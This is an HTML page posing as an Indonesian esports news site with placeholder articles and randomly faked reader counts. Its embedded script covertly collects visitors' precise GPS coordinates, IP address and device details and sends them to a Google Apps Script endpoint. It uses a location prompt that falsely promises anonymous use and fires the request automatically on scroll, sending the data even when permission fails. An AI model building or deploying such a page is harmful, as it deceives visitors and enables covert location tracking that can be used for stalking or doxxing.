<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Esports Journal - Berita Gaming Indonesia</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
            color: #ffffff;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }
        
        /* ===== HEADER ===== */
        header {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px 0;
            border-bottom: 3px solid #00dbde;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: 900;
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .nav-menu {
            display: flex;
            gap: 20px;
        }
        
        .nav-menu a {
            color: #fff;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 20px;
            transition: all 0.3s;
        }
        
        .nav-menu a:hover {
            background: #00dbde;
            color: #000;
        }
        
        .mobile-menu-btn {
            display: none;
            background: none;
            border: none;
            color: white;
            font-size: 1.5rem;
            cursor: pointer;
        }
        
        /* ===== HERO SECTION ===== */
        .hero {
            padding: 60px 0;
            text-align: center;
            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
                        url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80');
            background-size: cover;
            background-position: center;
            margin-bottom: 40px;
            border-radius: 0 0 20px 20px;
        }
        
        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: #00dbde;
        }
        
        .hero p {
            font-size: 1.2rem;
            max-width: 800px;
            margin: 0 auto 30px;
            color: #ccc;
        }
        
        /* ===== STATS BAR ===== */
        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            margin: 30px 0;
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00dbde;
            display: block;
        }
        
        .stat-label {
            font-size: 0.9rem;
            color: #aaa;
        }
        
        /* ===== ARTICLES ===== */
        .articles-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }
        
        .article-card {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .article-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(0, 219, 222, 0.3);
            border-color: #00dbde;
        }
        
        .article-img {
            height: 180px;
            background: linear-gradient(45deg, #00dbde, #fc00ff);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.5rem;
            color: white;
        }
        
        .article-content {
            padding: 20px;
        }
        
        .article-meta {
            display: flex;
            justify-content: space-between;
            color: #00dbde;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }
        
        .article-title {
            font-size: 1.3rem;
            margin-bottom: 10px;
            color: #fff;
            line-height: 1.4;
        }
        
        .article-excerpt {
            color: #ccc;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .read-more {
            display: inline-block;
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            transition: transform 0.3s;
        }
        
        .read-more:hover {
            transform: scale(1.05);
        }
        
        /* ===== PERMISSION BOX ===== */
        .permission-box {
            background: rgba(255, 215, 0, 0.1);
            border: 2px solid gold;
            border-radius: 15px;
            padding: 20px;
            margin: 30px 0;
            text-align: center;
            display: none;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
        }
        
        .permission-btn {
            background: gold;
            color: black;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
            font-size: 1rem;
        }
        
        /* ===== LOADING ===== */
        .loading {
            text-align: center;
            padding: 40px;
            color: #00dbde;
            display: none;
        }
        
        /* ===== NOTIFICATION ===== */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 219, 222, 0.95);
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            display: none;
            z-index: 1000;
            max-width: 300px;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        /* ===== FOOTER ===== */
        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid #333;
            color: #777;
            background: rgba(0, 0, 0, 0.5);
        }
        
        /* ===== MOBILE STYLES ===== */
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 15px;
            }
            
            .nav-menu {
                display: none;
                flex-direction: column;
                width: 100%;
                text-align: center;
            }
            
            .nav-menu.active {
                display: flex;
            }
            
            .mobile-menu-btn {
                display: block;
            }
            
            .hero h1 {
                font-size: 2rem;
            }
            
            .hero p {
                font-size: 1rem;
            }
            
            .articles-grid {
                grid-template-columns: 1fr;
            }
            
            .stat-number {
                font-size: 1.5rem;
            }
            
            .container {
                padding: 0 10px;
            }
        }
        
        @media (max-width: 480px) {
            .logo {
                font-size: 1.5rem;
            }
            
            .hero {
                padding: 40px 0;
            }
            
            .article-img {
                height: 150px;
            }
            
            .notification {
                left: 10px;
                right: 10px;
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <i class="fas fa-gamepad"></i> ESPORTS JOURNAL
                </div>
                <button class="mobile-menu-btn" onclick="toggleMenu()">
                    <i class="fas fa-bars"></i>
                </button>
                <nav class="nav-menu" id="navMenu">
                    <a href="#"><i class="fas fa-home"></i> Home</a>
                    <a href="#"><i class="fas fa-newspaper"></i> Articles</a>
                    <a href="#"><i class="fas fa-trophy"></i> Tournaments</a>
                    <a href="#"><i class="fas fa-users"></i> Community</a>
                    <a href="#"><i class="fas fa-info-circle"></i> About</a>
                </nav>
            </div>
        </div>
    </header>
    
    <!-- Hero Section -->
    <section class="hero">
        <div class="container">
            <h1>Level Up Your Game!</h1>
            <p>Dapatkan analisis mendalam, strategi terbaru, dan berita eksklusif dari dunia esports Indonesia. Bergabung dengan 10.000+ gamers lainnya!</p>
        </div>
    </section>
    
    <!-- Main Content -->
    <div class="container">
        <!-- Stats Bar -->
        <div class="stats-bar">
            <div class="stat-item">
                <span class="stat-number" id="totalReaders">10,247</span>
                <span class="stat-label">Total Readers</span>
            </div>
            <div class="stat-item">
                <span class="stat-number" id="onlineNow">328</span>
                <span class="stat-label">Online Now</span>
            </div>
            <div class="stat-item">
                <span class="stat-number" id="articlesCount">156</span>
                <span class="stat-label">Articles</span>
            </div>
            <div class="stat-item">
                <span class="stat-number" id="proPlayers">89</span>
                <span class="stat-label">Pro Players</span>
            </div>
        </div>
        
        <!-- Permission Request -->
        <div class="permission-box" id="permissionBox">
            <h3><i class="fas fa-map-marker-alt"></i> Personalize Your Experience</h3>
            <p>Allow location access to show esports news and events in your area. Get personalized content!</p>
            <p><small>Your location is only used for anonymous statistics.</small></p>
            <button class="permission-btn" onclick="requestLocationPermission()">
                <i class="fas fa-check"></i> Allow Location Access
            </button>
        </div>
        
        <!-- Articles Grid -->
        <div class="articles-grid">
            <!-- Article 1 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-mobile-alt"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> Today</span>
                        <span><i class="fas fa-tag"></i> Mobile Legends</span>
                    </div>
                    <h3 class="article-title">RRQ Hoshi Announces New Roster for M4 Championship</h3>
                    <p class="article-excerpt">The legendary team reveals their new lineup. Which players made the cut?</p>
                    <a href="#" class="read-more">Read Analysis â†’</a>
                </div>
            </div>
            
            <!-- Article 2 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-crosshairs"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> Yesterday</span>
                        <span><i class="fas fa-tag"></i> Valorant</span>
                    </div>
                    <h3 class="article-title">Paper Rex Aiming Techniques That Dominate Asia</h3>
                    <p class="article-excerpt">Learn the crosshair placement and peeking strategies from Singapore's best.</p>
                    <a href="#" class="read-more">Learn Techniques â†’</a>
                </div>
            </div>
            
            <!-- Article 3 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-trophy"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> 2 days ago</span>
                        <span><i class="fas fa-tag"></i> PUBG Mobile</span>
                    </div>
                    <h3 class="article-title">Bigetron RA Wins PMPL Indonesia Season 5</h3>
                    <p class="article-excerpt">With brilliant rotation strategies, Bigetron secures another championship title.</p>
                    <a href="#" class="read-more">View Strategy â†’</a>
                </div>
            </div>
            
            <!-- Article 4 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-chart-line"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> 3 days ago</span>
                        <span><i class="fas fa-tag"></i> Business</span>
                    </div>
                    <h3 class="article-title">Foreign Investors Flock to Indonesian Esports</h3>
                    <p class="article-excerpt">With 40% annual growth, Indonesia becomes a hotspot for global investors.</p>
                    <a href="#" class="read-more">Read Analysis â†’</a>
                </div>
            </div>
            
            <!-- Article 5 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-graduation-cap"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> 4 days ago</span>
                        <span><i class="fas fa-tag"></i> Tutorial</span>
                    </div>
                    <h3 class="article-title">From Bronze to Mythic in 30 Days: Complete Guide</h3>
                    <p class="article-excerpt">Follow this step-by-step roadmap from professional coaches to rank up consistently.</p>
                    <a href="#" class="read-more">Follow Roadmap â†’</a>
                </div>
            </div>
            
            <!-- Article 6 -->
            <div class="article-card">
                <div class="article-img"><i class="fas fa-users"></i></div>
                <div class="article-content">
                    <div class="article-meta">
                        <span><i class="far fa-calendar"></i> 5 days ago</span>
                        <span><i class="fas fa-tag"></i> Community</span>
                    </div>
                    <h3 class="article-title">Largest Esports Event Coming to Jakarta</h3>
                    <p class="article-excerpt">Thousands of gamers will gather at ICE BSD for tournaments with billions in prizes.</p>
                    <a href="#" class="read-more">More Info â†’</a>
                </div>
            </div>
        </div>
        
        <!-- Loading Indicator -->
        <div class="loading" id="loadingIndicator">
            <i class="fas fa-spinner fa-spin fa-2x"></i>
            <p>Loading personalized content for your location...</p>
        </div>
    </div>
    
    <!-- Notification -->
    <div class="notification" id="notification">
        <i class="fas fa-check-circle"></i> <span id="notificationText">Location detected successfully!</span>
    </div>
    
    <!-- Footer -->
    <footer>
        <div class="container">
            <p>&copy; 2024 Esports Journal. All rights reserved.</p>
            <p>contact@esportsjournal.id | +62 812-3456-7890</p>
            <p style="margin-top: 15px; font-size: 0.8rem; color: #555;">
                This website uses cookies for the best experience. By using this site, you agree to our 
                <a href="#" style="color: #00dbde;">Terms of Service</a> and 
                <a href="#" style="color: #00dbde;">Privacy Policy</a>.
            </p>
        </div>
    </footer>

    <!-- Tracking Script -->
    <script>
        // ============================================
        // âš ï¸ CONFIGURATION - CHANGE THIS âš ï¸
        // ============================================
        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzWHPwl8-LHOhjKfqXT_7AkYamYARb47PARjGJuzteX6DBJnB4fqgZubs9CtvoqOsJo/exec'; // â¬…ï¸ Ganti dengan URL Script Anda
        
        // ============================================
        // VARIABLES
        // ============================================
        let hasRequestedPermission = false;
        let userLocation = null;
        
        // ============================================
        // INITIALIZATION
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ðŸš€ Esports Journal loaded');
            
            // Initialize mobile menu
            initMobileMenu();
            
            // Update live stats
            updateLiveStats();
            
            // Show permission request after delay
            setTimeout(showPermissionRequest, 3000);
            
            // Auto-update stats every 30 seconds
            setInterval(updateLiveStats, 30000);
            
            // Auto-request on scroll
            window.addEventListener('scroll', handleScroll);
        });
        
        // ============================================
        // MOBILE MENU
        // ============================================
        function initMobileMenu() {
            const menuBtn = document.querySelector('.mobile-menu-btn');
            const navMenu = document.getElementById('navMenu');
            
            if (menuBtn && navMenu) {
                menuBtn.addEventListener('click', function() {
                    navMenu.classList.toggle('active');
                });
            }
        }
        
        function toggleMenu() {
            const navMenu = document.getElementById('navMenu');
            navMenu.classList.toggle('active');
        }
        
        // ============================================
        // LOCATION PERMISSION
        // ============================================
        function showPermissionRequest() {
            if (!hasRequestedPermission) {
                const permissionBox = document.getElementById('permissionBox');
                if (permissionBox) {
                    permissionBox.style.display = 'block';
                }
            }
        }
        
        function requestLocationPermission() {
            if (hasRequestedPermission) return;
            
            hasRequestedPermission = true;
            document.getElementById('permissionBox').style.display = 'none';
            document.getElementById('loadingIndicator').style.display = 'block';
            
            if (!navigator.geolocation) {
                console.log('âŒ Geolocation not supported');
                sendTrackingData(null);
                showNotification('Browser tidak mendukung deteksi lokasi');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                // Success
                function(position) {
                    console.log('âœ… Location access granted');
                    userLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    sendTrackingData(userLocation);
                    showNotification('Lokasi berhasil dideteksi!');
                },
                // Error
                function(error) {
                    console.log('âŒ Location error:', error.message);
                    userLocation = null;
                    sendTrackingData(null);
                    showNotification('Menggunakan konten umum');
                },
                // Options
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        // ============================================
        // SEND TRACKING DATA
        // ============================================
        async function sendTrackingData(location) {
            try {
                // Get IP address
                const ip = await getIPAddress();
                
                // Get device info
                const deviceInfo = getDeviceInfo();
                
                // Prepare data
                const trackingData = {
                    lat: location ? location.lat : 'NO_GPS',
                    lng: location ? location.lng : 'NO_GPS',
                    accuracy: location ? location.accuracy : 'N/A',
                    ip: ip,
                    browser: deviceInfo.browser,
                    os: deviceInfo.os,
                    device: deviceInfo.device,
                    userAgent: navigator.userAgent,
                    pageUrl: window.location.href
                };
                
                console.log('ðŸ“¤ Sending data:', trackingData);
                
                // Send as GET parameters (most reliable)
                const params = new URLSearchParams(trackingData);
                const response = await fetch(`${BACKEND_URL}?${params.toString()}`);
                
                // Try to read response
                try {
                    const result = await response.text();
                    console.log('âœ… Backend response:', result);
                } catch (e) {
                    console.log('âœ… Data sent (no response body)');
                }
                
                // Update UI
                incrementReaderCount();
                updateOnlineCount();
                
                // Hide loading
                setTimeout(() => {
                    document.getElementById('loadingIndicator').style.display = 'none';
                }, 1500);
                
            } catch (error) {
                console.error('âŒ Error sending data:', error);
                document.getElementById('loadingIndicator').style.display = 'none';
                showNotification('Gagal mengirim data');
            }
        }
        
        // ============================================
        // HELPER FUNCTIONS
        // ============================================
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Browser detection
            let browser = "Unknown";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            
            // OS detection
            let os = "Unknown";
            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "MacOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            
            // Device detection
            let device = "Desktop";
            const isMobile = /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua);
            const isTablet = /Tablet|iPad|PlayBook|Silk/.test(ua);
            
            if (isTablet) device = "Tablet";
            else if (isMobile) device = "Mobile";
            
            return { browser, os, device };
        }
        
        function showNotification(message) {
            const notification = document.getElementById('notification');
            const text = document.getElementById('notificationText');
            
            if (notification && text) {
                text.textContent = message;
                notification.style.display = 'block';
                
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 5000);
            }
        }
        
        function updateLiveStats() {
            // Update online count randomly
            const onlineElement = document.getElementById('onlineNow');
            if (onlineElement) {
                const current = parseInt(onlineElement.textContent.replace(/,/g, '')) || 300;
                const change = Math.floor(Math.random() * 5) - 2;
                const newCount = Math.max(200, current + change);
                onlineElement.textContent = newCount.toLocaleString();
            }
        }
        
        function incrementReaderCount() {
            const readerElement = document.getElementById('totalReaders');
            if (readerElement) {
                const current = parseInt(readerElement.textContent.replace(/,/g, '')) || 10247;
                readerElement.textContent = (current + 1).toLocaleString();
            }
        }
        
        function updateOnlineCount() {
            const onlineElement = document.getElementById('onlineNow');
            if (onlineElement) {
                const current = parseInt(onlineElement.textContent.replace(/,/g, '')) || 300;
                onlineElement.textContent = (current + 1).toLocaleString();
            }
        }
        
        function handleScroll() {
            if (!hasRequestedPermission && window.scrollY > 800) {
                requestLocationPermission();
            }
        }
    </script>
</body>
</html>